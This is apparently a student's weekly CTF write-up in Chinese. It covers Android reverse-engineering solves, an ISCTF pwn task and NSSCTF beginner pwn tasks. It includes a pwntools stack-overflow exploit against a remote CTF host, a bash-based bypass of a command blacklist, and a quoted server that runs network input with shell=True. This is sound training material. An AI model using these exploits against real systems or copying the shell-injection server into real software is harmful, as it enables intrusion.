---
title: "第十周周报"
published: 2026-11-22
description: "第十周周报：ISCTF 逆向（蓝鲨 checkcheck / check / 小蓝鲨的通行证）与 Pwn（Registry Audit），以及 NSCTF 新生赛 Pwn。"
tags: ["周报", "逆向", "CTF", "Pwn", "Android"]
series: "本周幕报"
category: "本周幕报"
slug: "1-week-10"
---

脚本与flag

只需要nc一下~

第一种

第二种

史铁生说过，如果你抑郁了，说明你活在过去，如果你焦虑了，说明你活在未来，如果你平静了，才说

明你是活在当下。不要沉溺过去，也不要忧虑未来，一定要好好活在当下，让自己快乐！

## ISCTF

### Re

#### 蓝鲨checkcheck

解压缩

这是一道安卓逆向，程序是一个apk文件，对于apk文件，第一步肯定是解包，可以用jadx拿到java文

件，或者解压缩，可以用unzip/7-zip，也可以改文件后缀改为zip然后解压

![第2页截图](/images/1-week-10/p02_0.png)

得到文件夹

先用jadx查看

![第3页截图](/images/1-week-10/p03_1.png)

重点看我标蓝的地方

说明真正的库是libblueshark_check.so

进入lib/x86_64，有几个.so文件，选择libblueshark_check.so放入DIE查看

![第4页截图](/images/1-week-10/p04_2.png)

有upx壳

脱壳

![第5页截图](/images/1-week-10/p05_3.png)

IDA打开查看

![第5页截图](/images/1-week-10/p05_4.png)

![第6页截图](/images/1-week-10/p06_5.png)

分析

先查看`anonymous namespace'::kTarget[n26]

![第6页截图](/images/1-week-10/p06_6.png)

26个数组

A6 C1 D0 E3 02 39 FF 16 7E DB 7D 06 32 E1 EA BA

D4 CA 70 62 F3 07 5E C8 70 ED

已知前几个为

![第6页截图](/images/1-week-10/p06_7.png)

已知前五个“ISCTF{”所以通过已知明文反推出key

然后通过密钥枚举出flag

脚本

Python

1 tgt = bytes.fromhex (

2 "a6c1d0e30239ff167edb7d0632e1eabad4ca7062f3075ec870ed"

3 )

5 def ror8(x, n):

6 n &= 7

7 return ((x >> n) | (x << (8 - n))) & 0xFF

9 def solve(rk, s):

10 return bytes(

11 ror8(tgt[i], (i % 5) + 1)

12 ^ ((rk + 0x11 * i) & 0xFF)

13 ^ s[i & 3]

14 for i in range(26)

15     )

17 for rk, s in [

18     (0x37, bytes([0x2D, 0x6B, 0x00, 0x00])),

19     (0xB7, bytes([0xAD, 0xEB, 0x80, 0x80])),

20 ]:

21 print(hex(rk), solve(rk, s).decode())

#### 蓝鲨check

获取信息

拿到题优先分析文件类型

是一个apk文件，依旧把apk当作一个压缩包解压

![第8页截图](/images/1-week-10/p08_8.png)

用jadx打开classes.dex

flag头

![第8页截图](/images/1-week-10/p08_9.png)

反汇编

用IDA打开lib文件夹中的.so文件

![第9页截图](/images/1-week-10/p09_10.png)

打开查看字符串

有明显的Base64编码，定位进入

![第9页截图](/images/1-week-10/p09_11.png)

解密

首先解第一个Base64编码

QzBOR3JAZHVJYXQxb240X3VfRjFuZF8=    —— >  C0NGr@duIat1on4_u_F1nd_

第二个解的时候没有解出来，一串乱码（不可见字符）

v44 = -19;

LODWORD(v19) = -1640531527;

do

这是典型的XXTEA的delta

所以这里应该是先解base64，

bs2 Python

1 83 aa f0 47 5d d5 95 b2 3c e3 fc b3 84 0a ff d1

2 54 12 95 ca 0c 4a ea 51 f6 b8 18 32 be 73 32 d6

这是密文需要进行解密

XXTEA的密钥是第一个bs1的前16个字符

这题是XXTEA和CBC

脚本

Python

1 import base64

3 #------------下面的是标准XXTEA的解密，在我知识库里存的-------------

5 DELTA = 0x9E3779B9

6 MASK = 0xFFFFFFFF

9 def _mx(y, z, s, p, e, k):

10 return ((((z >> 5) ^ (y << 2)) + ((y >> 3) ^ (z << 4)))

11 ^ ((s ^ y) + (k[(p & 3) ^ e] ^ z))) & MASK

14 def _key_words (key: bytes):

15 k = key.ljust(16, b"\x00" )[:16]

16 return [int.from_bytes (k[i:i + 4], "little" ) for i in range(0, 16, 4)

]

19 def _to_words (data: bytes, pad=True):

20 if pad and len(data) % 4:

21 data = data + b"\x00" * (4 - len(data) % 4)

22 return [int.from_bytes (data[i:i + 4], "little" ) for i in range(0, len

(data), 4)]

25 def _from_words (words):

26 return b"".join(w.to_bytes (4, "little" ) for w in words)

29 def xxtea_encrypt (data: bytes, key: bytes) -> bytes:

30 v = _to_words (data)

31 k = _key_words (key)

32 n = len(v)

33 if n < 2:

34 return data

35 rounds = 6 + 52 // n

36 s = 0

37 z = v[n - 1]

38 for _ in range(rounds):

39 s = (s + DELTA) & MASK

40 e = (s >> 2) & 3

41 for p in range(n - 1):

42 y = v[p + 1]

43 v[p] = (v[p] + _mx(y, z, s, p, e, k)) & MASK

44 z = v[p]

y = v[0]

v[n - 1] = (v[n - 1] + _mx(y, z, s, n - 1, e, k)) & MASK

z = v[n - 1]

return _from_words (v)

def xxtea_decrypt (data: bytes, key: bytes, orig_len =None) -> bytes:

v = _to_words (data, pad=False)

k = _key_words (key)

n = len(v)

if n < 2:

out = data

else:

rounds = 6 + 52 // n

s = (rounds * DELTA) & MASK

y = v[0]

for _ in range(rounds):

e = (s >> 2) & 3

for p in range(n - 1, 0, -1):

z = v[p - 1]

v[p] = (v[p] - _mx(y, z, s, p, e, k)) & MASK

y = v[p]

z = v[n - 1]

v[0] = (v[0] - _mx(y, z, s, 0, e, k)) & MASK

y = v[0]

s = (s - DELTA) & MASK

out = _from_words (v)

return out[:orig_len ] if orig_len is not None else out.rstrip(b"\x00"

)

#-------------------------解题-------------------------

bs1 = "QzBOR3JAZHVJYXQxb240X3VfRjFuZF8="

bs2 = "g6rwR13VlbI84/yzhAr/0VQSlcoMSupR9rgYMr5zMtY="

def main():

seg1 = base64.b64decode (bs1)

print("上半部分:", seg1.decode())

ct = base64.b64decode (bs2)

key = seg1[:16]

iv = bs1.encode()[:16]

parts = []

for offset in range(0, len(ct), 16):

91 cipher = ct[offset:offset + 16]

xor_target = iv if offset == 0 else ct[offset - 16:offset]

temp = xxtea_decrypt (cipher, key, 16)

plain_block = bytes(a ^ b for a, b in zip(temp, xor_target ))

parts.append(plain_block )

seg2 = b"".join(parts)[:24]

print("下半部分:", seg2.decode())

flag = "ISCTF{" + seg1.decode() + seg2.decode() + "}"

print("Flag:" , flag)

if __name__ == "__main__" :

main()

![第13页截图](/images/1-week-10/p13_12.png)

![第13页截图](/images/1-week-10/p13_13.png)

![第14页截图](/images/1-week-10/p14_14.png)

#### 小蓝鲨的通行证

信息获取

手机上下载运行

![第15页截图](/images/1-week-10/p15_15.png)

apk文件

改名字解压缩

分析

进入lib文件夹，我习惯分析x86那个， ida打开

![第16页截图](/images/1-week-10/p16_16.png)

先查看 Java_com_echopass_core_NativeBridge_nativeVerify()这个是一个假的真正的进入

JNI_OnLoad

查看定位地址0x3C10

![第16页截图](/images/1-week-10/p16_17.png)

得知真正校验函数在sub_28E0

进入

![第17页截图](/images/1-week-10/p17_18.png)

自己不会分析，让ai写解题脚本，然后我学

解密及脚本

要找两组数据，在java层，用jadx打开

![第17页截图](/images/1-week-10/p17_19.png)

![第17页截图](/images/1-week-10/p17_20.png)

第二张图片上代码是把三段拼成16字节

UiTheme.resolveAccent()     -> -12951775

PaletteIndex.baseOffset()   -> 186106078

CompatShim.packTag()        -> "echo2.41"

seed = 215f3aff dec0170b 6563686f322e3431

然后再看

![第18页截图](/images/1-week-10/p18_21.png)

光标所在就是

291273235  = 0x115C7A13  -> 13 7A 5C 11

961244674  = 0x394B6E02  -> 02 6E 4B 39

salt = 137a5c11026e4b39

在IDA里sub_2450是一个小VM虚拟机，用两组数据生成0xB9F（ 2975）字节的字节码然后与.so文件里

的表进行异或（ 0x620）

每条指令固定7字节

总共425条指令

然后进行GF(2)线性变换

最后得到flag

inner = j4v4_s33d_jn1_byt3c0d3_vm_1n51d3

flag  = ISCTF{j4v4_s33d_jn1_byt3c0d3_vm_1n51d3}

因为里面有调用.so,所以脚本在有那个文件的目录跑

Python

1 import struct

3 SO = "libticket.so"

4 d = open(SO, "rb").read()

6 # ===== 1. seed / salt （来自 Java 层）  =====

7 # SeedSource.collect()

8 seed = (struct.pack("<i", -12951775 )

9 + struct.pack("<I", 186106078 )

10 + b"echo2.41" )

12 # EchoSalt.nativeSalt()

13 salt = struct.pack("<II", 291273235 , 961244674 )

15 # ===== 2. 生成 VM 字节码 =====

16 # 对应 sub_2450 里的第一个循环

17 B = bytearray (0xB9F)

18 eax, ecx, dil = 1, 3, 0x6B

20 while True:

21 B[eax - 1] = (seed[(ecx - 3) & 0xE]

22 + salt[(eax - 1) & 6]

23 + dil + 0xEF) & 0xFF

24 if eax == 0xB9F:

25 break

26 B[eax] = (seed[ecx & 0xF]

27 + salt[eax & 7]

28 + dil) & 0xFF

29 eax += 2

30 ecx += 6

31 dil = (dil + 0x22) & 0xFF

33 # ===== 3. 解密字节码 =====

34 code = bytearray (0xB9F)

36 # 前 0xB80 字节和 0x620 表异或

37 for i in range(0xB80):

38 code[i] = B[i] ^ d[0x620 + i]

40 # 尾部 3 个 8 字节常量

41 patches = [

42 0x4AC59A51836F640E ,

43 0x407B308504125CDA ,

44 0x5AD5DE629063771E ,

45 ]

46 for k, c in enumerate (patches ):

for j in range(8):

code[0xB80 + k * 8 + j] = (

B[0xB80 + k * 8 + j] ^ ((c >> (8 * j)) & 0xFF)

)

# 最后 7 字节

tail = [0xE1, 0x6C, 0x24, 0x15, 0x96, 0x40, 0x8B]

for j, x in enumerate (tail):

code[0xB98 + j] = B[0xB98 + j] ^ x

code = bytes(code)

# ===== 4. 读取数据表 =====

perm = d[0x5D0:0x5F0]   # 32 字节置换

const8 = d[0x5F0:0x5F8]   # RAM[0x40..0x47]

target = d[0x600:0x620]   # 32 字节目标

# ===== 5. VM 执行器 =====

def rol32(x, n):

n &= 31

return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF if n else x

def ror32(x, n):

n &= 31

return ((x >> n) | (x << (32 - n))) & 0xFFFFFFFF if n else x

def run(inp):

ram = bytearray (128)

# RAM[0..31] = 输入按 perm 打乱

for i in range(32):

ram[i] = inp[perm[i]]

# RAM[0x40..0x47] = const8

ram[0x40:0x48] = const8

# RAM[0x50..0x57] = salt

ram[0x50:0x58] = salt

regs = [0] * 8

pc = 0

while True:

op = code[pc]

a = code[pc + 1]

b = code[pc + 2]

imm = struct.unpack("<i", code[pc + 3:pc + 7])[0]

94 pc += 7

if op == 1:           # LOADI

regs[a & 7] = imm & 0xFFFFFFFF

elif op == 2:         # LOAD

addr = b & 0x7F

regs[a & 7] = int.from_bytes (ram[addr:addr + 4], "little" )

elif op == 3:         # STORE

addr = a & 0x7F

ram[addr:addr + 4] = (regs[b & 7] & 0xFFFFFFFF ).to_bytes (4,

"little" )

elif op == 4:         # MOV

regs[a & 7] = regs[b & 7]

elif op == 6:         # XOR

regs[a & 7] ^= regs[b & 7]

elif op == 7:         # ROL

regs[a & 7] = rol32(regs[a & 7], b)

elif op == 8:         # ROR

regs[a & 7] = ror32(regs[a & 7], b)

elif op == 11:        # HALT

break

elif op == 12:        # ROLX

regs[a & 7] = rol32(regs[a & 7], b) ^ 0x5A5A5A5A

else:

raise ValueError (f"bad opcode  {op} at {pc - 7:#x}")

return bytes(ram[:32])

# ===== 6. 建 GF(2) 线性方程组 =====

def vec(b):

"""32 字节 -> 256 位整数"""

return sum(1 << i for i in range(256) if (b[i // 8] >> (i % 8)) & 1)

C = vec(run(bytes(32)))       # 输入全 0 的常数项

cols = []

for k in range(256):

inp = bytearray (32)

inp[k // 8] ^= 1 << (k % 8)

cols.append(vec(run(bytes(inp))) ^ C)

b = vec(target) ^ C

# 建 256 行，每行 256 个变量 + 1 个常数位

rows = []

for j in range(256):

row = 0

for k in range(256):

141 if (cols[k] >> j) & 1:

row |= 1 << k

if (b >> j) & 1:

row |= 1 << 256

rows.append(row)

# 高斯消元

pivots = []

r = 0

for c in range(256):

sel = None

for i in range(r, 256):

if (rows[i] >> c) & 1:

sel = i

break

if sel is None:

continue

rows[r], rows[sel] = rows[sel], rows[r]

for i in range(256):

if i != r and ((rows[i] >> c) & 1):

rows[i] ^= rows[r]

pivots.append(c)

r += 1

if r == 256:

break

x = 0

for i, c in enumerate (pivots):

if (rows[i] >> 256) & 1:

x |= 1 << c

sol = bytearray (32)

for k in range(256):

if (x >> k) & 1:

sol[k // 8] |= 1 << (k % 8)

# ===== 7. 输出 =====

print("inner =" , sol)

print("flag  = ISCTF{" + sol.decode() + "}")

print("verify =" , run(sol) == target)

![第23页截图](/images/1-week-10/p23_22.png)

### Pwn

我先配了一个专门打Pwn的虚拟机

![第23页截图](/images/1-week-10/p23_23.png)

#### Registry Audit

获取信息

先判断一下文件类型

![第24页截图](/images/1-week-10/p24_24.png)

是静态ELF64位

列出保护机制

![第24页截图](/images/1-week-10/p24_25.png)

打印字符串

![第25页截图](/images/1-week-10/p25_26.png)

太杂乱了，筛选一下

![第25页截图](/images/1-week-10/p25_27.png)

1 list  2 edit  3 view  4 audit  0 exit

__new_exitfn

corrupted double-linked list (not small)

malloc(): smallbin double linked list corrupted

malloc(): unsorted double linked list corrupted

malloc(): largebin double linked list corrupted (nextsize)

malloc(): largebin double linked list corrupted (bk)

get_free_list

Failed loading %lu audit modules, %lu are supported.

listp->slotinfo[cnt].gen <= GL(dl_tls_generation)

new_nlist < ns->_ns_global_scope_alloc

cannot allocate dependency list

map->l_searchlist.r_list == NULL

cannot allocate symbol search list

cxa_atexit.c

exit 0

corrupted double-linked list

listp != NULL

Argument list too long

cannot create scope list

map_index < nlist

__internal_atexit

remove_from_free_list

LD_AUDIT

memory_arena_reuse_free_list

cxa_atexit.o

__exit_lock

list_all_lock

freeres_list

free_list_lock

tunable_list

tunable_env_alias_list

transmem_list

_IO_list_lock

__nptl_stack_list_del

_sys_errlist_internal_len

_dl_initial_searchlist

__exit_funcs

__get_errlist

__internal_atexit

__environ_array_list

__new_exitfn

__exit_funcs_lock

_dl_audit_pltexit

_dl_add_to_namespace_list

__exit_funcs_done

_nl_make_l10nflist

_dl_tls_dtv_slotinfo_list

__run_exit_handlers

__cxa_atexit

_dl_scope_free_list

_IO_list_resetlock

__new_exitfn_called

__rtld_env_path_list

_IO_list_unlock

_nl_locale_file_list

__nptl_stack_list_add

_sys_errlist_internal

_IO_list_all

查询并过滤符号表

![第28页截图](/images/1-week-10/p28_28.png)

反汇编

IDA打开查看main函数

![第29页截图](/images/1-week-10/p29_29.png)

进入show_record/set_record/walk_records这三个函数查看因为有标记"1 list  2 edit  3 view  4 audit

0 exit"

show_record： 3.view

set_record： 2.edit

walk_records： 1.list

分析漏洞

ld1： set_record： 2.edit

Python

1 __int64 set_record ()

2 {

3 __int64 result; // rax

4 int v1; // ecx

5 int v2; // r8d

6 int v3; // r9d

7   char v4[ 44]; // [rsp+0h] [rbp-30h] BYREF

8   int n7;  // [rsp+2Ch] [rbp-4h]

10   IO_puts(( __int64 )"index:");

11   result  = take_line ((__int64 )v4, 32);

12 if ( (int)result >= 0 )

13   {

14 n7 = atoi(v4);

15 if ( n7 <= 7 )

16     {

17 _printf ((unsigned  int)"data for %d:\n",  n7, (unsigned  int)"data for

%d:\n",  v1, v2, v3, v4[0]);

18 _read(0, (char *)&g_book + 64 * n7 + 64, 64);

19 return IO_puts ((__int64 )"stored");

20     }

21 else

22     {

23 return IO_puts ((__int64 )"out of range");

24     }

25   }

26 return result;

27 }

只限制了if (n7 <= 7)    如果i<0则全部通过

&g_book + 64 * n7 + 64, 64)      —— >写入地址 = g_book + (i + 1) * 0x40

ld2： show_record： 3.view

Python

1 __int64 __fastcall show_record (__int64  a1, __int64  n32, __int64  a3, int a4,

int a5, int a6)

2 {

3 char v7[64]; // [ rsp+0h] [rbp-40h] BYREF

5 _printf ((unsigned  int)"record size: %u\n",  n64, (unsigned  int)"record siz

e: %u\n",  a4, a5, a6, v7[0]);

6 _read(0, (int)v7, n64);

7 return IO_puts ((__int64 )v7);

8 }

这里v7 = 64没有问题，但是如果我改一下，改成v7 = 128/256/512/1024就有问题了多出来的字节会顺

着栈往上依次覆盖//栈溢出

（无canary）随机值

解题

输入在虚拟机输入

cd ~/pwn/reg	跳转目录

gdb -q ./chal \	动调

-ex 'b *0x4023e9' \	 在main函数入口点下断点

-ex 'run' \	运行

-ex 'restore sealed.rec binary 0x4c0000' \	调用sealed.rec，写进内存

-ex 'call (int)stamp_record(0x4c0000, 18)' \		调用隐藏函数，进行解密，输出flag

-ex 'quit'

![第31页截图](/images/1-week-10/p31_30.png)

![第32页截图](/images/1-week-10/p32_31.png)

至于为什么是stamp_record（虽然这个没有任何一函数调用或交叉引用）

1.名字翻译过来：盖章记录

2.函数内长度正等于附件里的18字节

最终flag： ISCTF{ts1relson_w4s_r1ght_p4th_zzzz}

ISCTF的题剩下的我不会做，准备先从NSSCTF上做一些pwn入门

## NSSCTF

### Pwn

#### SWPUCTF Pwn新生赛签到题

![第33页截图](/images/1-week-10/p33_32.png)

启动虚拟机，进入对应目录

![第33页截图](/images/1-week-10/p33_33.png)

这个文件本身就是一个py文件（上面的是我给改名了）

![第34页截图](/images/1-week-10/p34_34.png)

黑名单： 'cat','ls',' ','cd','echo','<','${IFS}'

没有过滤bash启用新的shall

所以用bash

![第35页截图](/images/1-week-10/p35_35.png)

先查看全部文件，注意有一个flag文件

cat它

获得flag： NSSCTF{ffb00bac-27a8-4cb5-addc-2bf90ec4e20f}

#### gift_pwn

信息获取

首先链接容器

![第36页截图](/images/1-week-10/p36_36.png)

无论怎么输入，都没有反应，说明不是上面那种考验shell命令使用的题

是一个ELF64文件、 checksec查看文件安全属性

![第36页截图](/images/1-week-10/p36_37.png)

第一行： 64 位 Linux 程序，小端

第二行： GOT 表可写→可以改 GOT

第三行：没有栈保护→栈溢出可以直接覆盖返回地址

第四行：栈/堆不可执行→不能直接往栈上写 shellcode 执行

第五行：程序基址固定 0x400000 →函数、 GOT 、 PLT 地址都是固定的

第六行：没去符号→函数名在

栈溢出不会触发__stack_chk_fail，可覆盖返回地址

无PIE，即地址固定

栈不可执行

可以直接在IDA上查看到函数名

所以用DIE查看一下文件类型

![第37页截图](/images/1-week-10/p37_38.png)

用IDA反汇编

![第37页截图](/images/1-week-10/p37_39.png)

发现调用vuln函数进入

![第38页截图](/images/1-week-10/p38_40.png)

点进去发现溢出点为buf[16]，但是read可以输入0x64（ _BYTE buf[16];   // [rsp+0h] [rbp-10h]

BYREF ）

![第38页截图](/images/1-week-10/p38_41.png)

存在/bin/sh权限文件进入

rodata:00000000004006A6 command         db '/bin/sh',0          ; DATA XREF: gift+E↑ o

栈溢出长度offset = 0x10 + 8 = 0x18 = 24

gift = 0x4005C4 - 0xE = 0x4005B6

脚本与flag

Python

1 # 导入 pwntools

2 from pwn import *

4 # 64 位 Linux

5 context (arch='amd64' , os='linux' )

7 # 调试时打开

8 # context.log_level = 'debug'

10 # ===== 1. 连接远程 =====

11 io = remote('node4.anna.nssnode.cn' , 23934)

13 # 本地测试用这个

14 # io = process('./附件1')

16 # ===== 2. 后门函数地址 =====

17 # objdump 确认： 0x4005b6 <gift>

18 gift = 0x4005B6

20 # ===== 3. 偏移 =====

21 # buf[16] 在 [rbp-0x10]

22 # 0x10 + 8 = 0x18 = 24

23 offset = 0x18

25 # ===== 4. 构造 payload =====

26 # 24 字节填充 + gift 地址

27 payload = b'A' * offset + p64(gift)

29 # ===== 5. 发送 =====

30 io.sendline (payload )

32 # ===== 6. 拿 shell =====

33 io.interactive ()

![第40页截图](/images/1-week-10/p40_42.png)

ls之后出现flag

![第40页截图](/images/1-week-10/p40_43.png)

最终flag： NSSCTF{5e8da6bd-b9e2-4ddb-bdb1-06eb9a07a608}

#### 只需要nc一下~

这个非常简单

nc链接

尝试ls

![第41页截图](/images/1-week-10/p41_44.png)

两个， cat第一个

![第41页截图](/images/1-week-10/p41_45.png)

这道题有两种解题方法

第一种

直接env

![第41页截图](/images/1-week-10/p41_46.png)

第二种

echo $FLAG

![第42页截图](/images/1-week-10/p42_47.png)

都是flag

NSSCTF{2cc49fdb-c781-4e0c-8c83-500d150c3442}

第二个我也cat了

cat app.py

Python

1 import os

2 import subprocess

3 import socketserver

5 class TerminalHandler (socketserver .StreamRequestHandler ):

6 def handle(self):

7 self.intro()

8 while True:

9 try:

10 data = self.rfile.readline ().strip()

11 if not data:

12 break

13 result = self.execute_command (data)

14 self.send_result (result)

15 except Exception as e:

16 self.send_error (str(e))

18 def intro(self):

19 self.wfile.write(b"Welcome to the virtual terminal!\n" )

21 def execute_command (self, command ):

22 output = subprocess .check_output (command , shell=True)

return output

def send_result (self, result):

self.wfile.write(result)

def send_error (self, error):

self.wfile.write(b"Error: " + error.encode() + b"\n")

if __name__ == "__main__" :

HOST, PORT = "0.0.0.0" , 9999

server = socketserver .ThreadingTCPServer ((HOST, PORT), TerminalHandler

)

server.serve_forever ()
